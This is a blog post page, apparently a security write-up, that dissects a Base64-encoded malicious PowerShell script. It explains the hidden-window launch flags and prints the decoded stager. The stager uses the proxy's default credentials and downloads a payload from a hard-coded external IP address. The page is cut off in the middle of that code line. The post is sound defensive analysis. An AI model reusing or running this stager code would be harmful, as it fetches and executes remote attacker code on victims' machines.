<!doctype html>
<html lang="en-us">
  <head>
    <title>Dissecting a Malicious PowerShell Script- A Detailed Analysis // Cloud architect insights :: Joshua Mangold</title>
    <link rel="shortcut icon" href="/favicon.ico" />
    <meta charset="utf-8" />
    <meta name="generator" content="Hugo 0.92.2" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <meta name="author" content="John Doe" />
    <meta name="description" content="" />
    <link rel="stylesheet" href="/mangoldaiwiki/css/main.min.d18c46a9c052e3fff4ff60ea22fff43c74140b8b952b4bbebd229127fbf997f3.css" />
    

    
    <meta name="twitter:card" content="summary"/>
<meta name="twitter:title" content="Dissecting a Malicious PowerShell Script- A Detailed Analysis"/>
<meta name="twitter:description" content="Dissecting a Malicious PowerShell Script: A Detailed Analysis Introduction You&rsquo;ve stumbled upon a puzzling Base64-encoded PowerShell script that appears to have malicious intent. As a cybersecurity professional, your mission is to dive deep into this script, uncover its true nature, and reveal the potential risks it poses to our digital realm. Get ready to embark on a daring quest to safeguard our systems!
Decoding the Script The first step is to decode the Base64-encoded script."/>

    <meta property="og:title" content="Dissecting a Malicious PowerShell Script- A Detailed Analysis" />
<meta property="og:description" content="Dissecting a Malicious PowerShell Script: A Detailed Analysis Introduction You&rsquo;ve stumbled upon a puzzling Base64-encoded PowerShell script that appears to have malicious intent. As a cybersecurity professional, your mission is to dive deep into this script, uncover its true nature, and reveal the potential risks it poses to our digital realm. Get ready to embark on a daring quest to safeguard our systems!
Decoding the Script The first step is to decode the Base64-encoded script." />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://jmangold23.github.io/mangoldaiwiki/posts/dissecting_a_malicious_powershell_script_a_detailed_analysis/" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2024-06-05T00:00:00+00:00" />
<meta property="article:modified_time" content="2024-06-05T00:00:00+00:00" />



  </head>
  <body>
    <header class="app-header">
      <a href="https://jmangold23.github.io/mangoldaiwiki/"><img class="app-header-avatar" src="/mangoldaiwiki/avatar.jpg" alt="John Doe" /></a>
      <span class="app-header-title">Cloud architect insights :: Joshua Mangold</span>
      <nav class="app-header-menu">
          <a class="app-header-menu-item" href="/mangoldaiwiki/">Home</a>
             - 
          
          <a class="app-header-menu-item" href="/mangoldaiwiki/tags/">Tags</a>
      </nav>
      <p>Cloud architecture, Azure, and tech innovations. Notes, tips, and insights.</p>
      <div class="app-header-social">
        
          <a href="https://github.com/jmangold23" target="_blank" rel="noreferrer noopener me">
            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-github">
  <title>My Github</title>
  <path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22"></path>
</svg>
          </a>
        
          <a href="https://www.linkedin.com/in/joshua-mangold-a7ba0989/" target="_blank" rel="noreferrer noopener me">
            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-linkedin">
  <title>My LinkedIn</title>
  <path d="M16 8a6 6 0 0 1 6 6v7h-4v-7a2 2 0 0 0-2-2 2 2 0 0 0-2 2v7h-4v-7a6 6 0 0 1 6-6z"></path><rect x="2" y="9" width="4" height="12"></rect><circle cx="4" cy="4" r="2"></circle>
</svg>
          </a>
        
      </div>
    </header>
    <main class="app-container">
      
  <article class="post">
    <header class="post-header">
      <h1 class ="post-title">Dissecting a Malicious PowerShell Script- A Detailed Analysis</h1>
      <div class="post-meta">
        <div>
          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-calendar">
  <title>calendar</title>
  <rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect><line x1="16" y1="2" x2="16" y2="6"></line><line x1="8" y1="2" x2="8" y2="6"></line><line x1="3" y1="10" x2="21" y2="10"></line>
</svg>
          Jun 5, 2024
        </div>
        <div>
          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-clock">
  <title>clock</title>
  <circle cx="12" cy="12" r="10"></circle><polyline points="12 6 12 12 16 14"></polyline>
</svg>
          1 min read
        </div>
        <div>
          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-tag">
  <title>tag</title>
  <path d="M20.59 13.41l-7.17 7.17a2 2 0 0 1-2.83 0L2 12V2h10l8.59 8.59a2 2 0 0 1 0 2.82z"></path><line x1="7" y1="7" x2="7.01" y2="7"></line>
</svg>
              <a class="tag" href="https://jmangold23.github.io/mangoldaiwiki/tags/powershell/">PowerShell</a>
        </div>
      </div>
    </header>
    <div class="post-content">
      <h2 id="dissecting-a-malicious-powershell-script-a-detailed-analysis">Dissecting a Malicious PowerShell Script: A Detailed Analysis</h2>
<h3 id="introduction">Introduction</h3>
<p>You&rsquo;ve stumbled upon a puzzling Base64-encoded PowerShell script that appears to have malicious intent. As a cybersecurity professional, your mission is to dive deep into this script, uncover its true nature, and reveal the potential risks it poses to our digital realm. Get ready to embark on a daring quest to safeguard our systems!</p>
<h3 id="decoding-the-script">Decoding the Script</h3>
<p>The first step is to decode the Base64-encoded script. By using the CyberChef tool, we can quickly reveal the underlying PowerShell code. The script starts with a series of command-line arguments that are designed to make the PowerShell window hidden and non-interactive when executed.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">powershell.exe -NoP -sta -NonI -W Hidden -Enc
</code></pre></div><p>These arguments include:</p>
<ul>
<li><code>-NoP</code>: Suppresses the loading of the Windows PowerShell profile.</li>
<li><code>-sta</code>: Starts PowerShell in a single-threaded apartment.</li>
<li><code>-NonI</code>: Runs PowerShell in non-interactive mode, preventing any prompts.</li>
<li><code>-W Hidden</code>: Sets the window style to hidden, making the PowerShell window invisible.</li>
<li><code>-Enc</code>: Accepts a Base64-encoded string as the command to be executed.</li>
</ul>
<p>After decoding the Base64 string, we can see the actual PowerShell code that the script is running:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">$WC=New-ObjEcT SySTeM.NET.WebCliENt;$u=<span style="color:#e6db74">&#39;Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko&#39;</span>;$WC.HeADeRS.ADd(<span style="color:#e6db74">&#39;User-Agent&#39;</span>,$u);$Wc.ProxY = <span style="color:#66d9ef">[System.NeT.WEBReQUEst]</span>::DEFAuLtWebProXy;$wc.PROxY.CrEdenTialS = <span style="color:#66d9ef">[SysTem.NEt.CRedeNTIAlCAcHE]</span>::DeFAULTNetWOrKCredENTiAls;$K=<span style="color:#e6db74">&#39;IM-S&amp;fA9Xu{[)|wdWJhC+!N~vq_12Lty&#39;</span>;$i=0;<span style="color:#66d9ef">[CHaR[]]</span>$B=(<span style="color:#66d9ef">[cHaR[]]</span>($wc.DOwNLOaDStriNg(<span style="color:#e6db74">&#34;http://98.103.103.170:7443/index.asp</span></code></pre></div>
    </div>
    <div class="post-footer">
      
    </div>
  </article>

    </main>
  </body>
</html>
